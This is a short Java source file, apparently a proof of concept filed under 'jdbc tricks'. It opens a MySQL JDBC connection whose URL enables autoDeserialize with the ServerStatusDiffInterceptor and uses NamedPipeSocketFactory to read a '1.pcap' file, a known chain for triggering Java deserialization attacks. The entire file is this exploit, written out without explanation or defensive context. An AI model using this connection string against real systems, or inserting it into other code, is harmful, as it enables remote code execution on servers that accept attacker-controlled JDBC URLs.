package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Case {
    public static void main(String[] args) {
        String url = "jdbc:mysql://xxxxxx/test?autoDeserialize=yes&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&password=root&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=1.pcap";
        String username = "root";
        String password = "root";
        try (Connection connection = DriverManager.getConnection(url, username, password)) {
            System.out.println("数据库连接成功!");
        } catch (SQLException e) {
            System.out.println("数据库连接失败!");
            e.printStackTrace();
        }
    }
}
